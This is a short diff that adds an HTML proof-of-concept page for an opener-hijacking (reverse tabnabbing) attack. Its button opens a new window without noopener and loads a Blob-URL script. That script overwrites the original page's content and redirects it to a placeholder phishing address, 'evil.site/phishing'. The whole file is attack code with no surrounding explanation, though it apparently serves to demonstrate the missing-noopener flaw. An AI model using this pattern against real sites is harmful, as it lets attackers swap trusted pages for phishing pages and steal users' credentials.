@@ -1,0 +1,18 @@
+<button onclick="test()">Hijack Opener</button>
+
+<script>
+function test() {
+  const w = window.open('', '_blank'); // no rel=noopener
+  const code = `
+    <script>
+      if (window.opener) {
+        window.opener.document.body.innerHTML = '<h1>Hijacked!</h1>';
+        window.opener.location = 'https://evil.site/phishing';
+      }
+    <\/script>
+  `;
+  const payload = new Blob([code], { type: 'text/html' });
+  const url = URL.createObjectURL(payload);
+  w.location = url;
+}
+</script>
